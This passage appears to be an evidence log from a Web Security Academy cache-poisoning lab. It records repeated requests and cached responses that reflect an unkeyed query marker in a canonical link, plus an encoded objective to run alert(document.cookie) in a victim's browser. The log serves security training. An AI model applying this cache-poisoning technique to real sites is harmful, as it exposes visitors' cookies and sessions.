                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr82z89o-78` — `artifacts/_/ev-mr82z89o-78/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

Response:

```http
HTTP/1.1 200
age: 18
cache-control: max-age=35
connection: close
content-encoding: gzip
content-length: 3620
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to=UMBRAPOISON9271'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr82zbku-79` — `artifacts/_/ev-mr82zbku-79/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

Response:

```http
HTTP/1.1 200
age: 22
cache-control: max-age=35
connection: close
content-encoding: gzip
content-length: 3620
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to=UMBRAPOISON9271'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr82zf4b-7a` — `artifacts/_/ev-mr82zf4b-7a/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

Response:

```http
HTTP/1.1 200
age: 27
cache-control: max-age=35
connection: close
content-encoding: gzip
content-length: 3620
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to=UMBRAPOISON9271'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
